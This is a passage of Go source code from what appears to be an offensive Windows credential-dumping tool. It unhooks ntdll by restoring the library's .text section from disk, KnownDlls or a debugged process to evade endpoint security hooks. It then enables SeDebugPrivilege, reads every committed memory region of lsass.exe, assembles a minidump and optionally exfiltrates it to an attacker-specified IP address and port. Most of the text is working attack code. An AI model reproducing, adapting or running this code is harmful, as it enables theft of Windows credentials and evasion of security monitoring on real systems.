    if optionFlag == "disk" {
        file_name := "C:\\Windows\\System32\\ntdll.dll"
        if pathFlag != "default" {
            file_name = pathFlag
        }
        // fmt.Printf("[+] Option \"disk\" - Getting clean version from file in disk %s\n", file_name)
        unhooked_ntdll_text = overwrite_disk(file_name)
        if (unhooked_ntdll_text != 0){
            // fmt.Printf("[+] Mapped Ntdll .Text:\t0x%s\n", fmt.Sprintf("%x", unhooked_ntdll_text))
        } else {
            fmt.Printf("[-] Error getting the .text section address")
            os.Exit(0)
        }
    } else if optionFlag == "knowndlls" {
        // fmt.Println("[+] Option \"knowndlls\" - Getting clean version from KnownDlls folder")
        unhooked_ntdll_text = overwrite_knowndlls()
        if (unhooked_ntdll_text != 0){
            // fmt.Printf("[+] Mapped Ntdll .Text:\t0x%s\n", fmt.Sprintf("%x", unhooked_ntdll_text))
        } else {
            fmt.Printf("[-] Error getting the .text section address")
            os.Exit(0)       
        }
    } else if optionFlag == "debugproc" {
        program_path := "c:\\Windows\\System32\\notepad.exe"
        if pathFlag != "default" {
            program_path = pathFlag
        }
        // fmt.Printf("[+] Option \"debugproc\" - Getting clean version from debugged process %s\n", program_path)
        unhooked_ntdll_text = overwrite_debugproc(program_path, local_ntdll_txt, local_ntdll_txt_size)
        if (unhooked_ntdll_text != 0){
            // fmt.Printf("[+] Mapped Ntdll .Text:\t0x%s\n", fmt.Sprintf("%x", unhooked_ntdll_text))
        } else {
            fmt.Printf("[-] Error getting the .text section address")
            os.Exit(0)       
        }
    } else {
        return
    }
    replace_ntdll_section(unhooked_ntdll_text, local_ntdll_txt, local_ntdll_txt_size)
}


func main() {
	// Ntdll overwrite options
	var optionFlagStr string
	var pathFlagStr string
	var ipAddrStr string
	var portAddrStr string
	flag.StringVar(&optionFlagStr, "o", "default", "Option for library overwrite: \"disk\", \"knowndlls\" or \"debugproc\"")
    flag.StringVar(&pathFlagStr,   "k", "default", "Path to ntdll file in disk (for \"disk\" option) or program to open in debug mode (\"debugproc\" option)")
    flag.StringVar(&ipAddrStr,     "i", "default", "IP Address for exfiltration")
    flag.StringVar(&portAddrStr,   "p", "default", "Port for exfiltration")
    
    flag.Parse()
    if (optionFlagStr != "default") {
    	overwrite(optionFlagStr, pathFlagStr)
    }

	// OS Information
	var osVersionInfo RTL_OSVERSIONINFOW
	osVersionInfo.DwOSVersionInfoSize = uint32(unsafe.Sizeof(osVersionInfo))
	ret, _, err := rtlGetVersion.Call(uintptr(unsafe.Pointer(&osVersionInfo)))
	if ret != 0 {
		fmt.Printf("RtlGetVersion failed: %v\n", err)
		return
	}
	osInfo := []OSInformation{{ Field0: fmt.Sprint(osVersionInfo.DwMajorVersion) , Field1: fmt.Sprint(osVersionInfo.DwMinorVersion), Field2: fmt.Sprint(osVersionInfo.DwBuildNumber)}}
	
	// Get PID
	process_name := "lsass.exe"
	proc_handle := GetProcessByName(process_name)[0]
	pid := get_pid(proc_handle)
	fmt.Printf("[+] Process PID:\t\t%d\n", pid)
	
	// Get SeDebugPrivilege
	priv_enabled := enable_SeDebugPrivilege()
	fmt.Printf("[+] Privilege Enabled:\t\t%t\n", priv_enabled)

	// Get process handle
	proc_handle = open_process(pid)
	fmt.Printf("[+] Process Handle: \t\t%d\n", proc_handle)
	
	// Get modules information (except module size)
	moduleinfo_arr := query_process_information(proc_handle)
	
	// Get size for each module
	var mem_address uintptr = 0
	var proc_max_address_l uintptr = 0x7FFFFFFEFFFF
	
    // Slice/Array for Mem64Information objects
	mem64list_arr := []Mem64Information{}
	memoryRegions_byte_arr := []byte{}

	aux_size := 0
	aux_name := ""

	for (mem_address < proc_max_address_l){
		var memInfo MEMORY_BASIC_INFORMATION
		var resultLength uintptr
		status, _, _ := ntQueryVirtualMemory.Call(proc_handle, mem_address, 0, uintptr(unsafe.Pointer(&memInfo)), uintptr(unsafe.Sizeof(memInfo)), uintptr(unsafe.Pointer(&resultLength)))
		if status != 0 {
			fmt.Printf("NtQueryVirtualMemory failed with status: 0x%x\n", status)
			return
		}	
		if (memInfo.Protect != PAGE_NOACCESS && memInfo.State == MEM_COMMIT){
			// Region info + Memory Dump
			buffer := make([]byte, memInfo.RegionSize)
			var bytesRead uintptr
			ntReadVirtualMemory.Call(proc_handle, memInfo.BaseAddress, uintptr(unsafe.Pointer(&buffer[0])), memInfo.RegionSize, uintptr(unsafe.Pointer(&bytesRead)))

			/// Add to buffer
			memoryRegions_byte_arr = append(memoryRegions_byte_arr, buffer...)

			// Add module information to slice
			mem64Info := Mem64Information{ Field0: uint64(memInfo.BaseAddress), Field1: uint32(memInfo.RegionSize),}
			mem64list_arr = append(mem64list_arr, mem64Info)

			// Module size
			var matching_object ModuleInformation = find_object(moduleinfo_arr, aux_name)
			matchingObjectUint64, _ := strconv.ParseUint(matching_object.Field2, 0, 64)
			if (memInfo.RegionSize == 0x1000 && memInfo.BaseAddress != uintptr(matchingObjectUint64)){
				moduleinfo_arr = update_module_slice(moduleinfo_arr, aux_name, aux_size)
				for i := 0; i < len(moduleinfo_arr); i++ {
					auxUint64, _ := strconv.ParseUint(moduleinfo_arr[i].Field2, 16, 64)
					if memInfo.BaseAddress == uintptr(auxUint64){
						aux_name = moduleinfo_arr[i].Field0
						aux_size = int(memInfo.RegionSize)
					}
				}
			} else {
				aux_size += int(memInfo.RegionSize)
			}
		}
		mem_address += memInfo.RegionSize
	}

	// Get dump file bytes
	dump_file := get_dump_bytearr(osInfo, moduleinfo_arr, mem64list_arr, memoryRegions_byte_arr)	
	output_file := "proc_" +  fmt.Sprintf("%d", pid) + ".dmp"
	
	// Write to file
	if (ipAddrStr != "default" && portAddrStr != "default") {
		exfiltrate_file(dump_file, ipAddrStr, portAddrStr)
		fmt.Printf("[+] File exfiltrated.\n")
	} else{ 
		writeToFile(output_file, dump_file)	
		fmt.Printf("[+] File %s generated.\n", output_file)
	}
}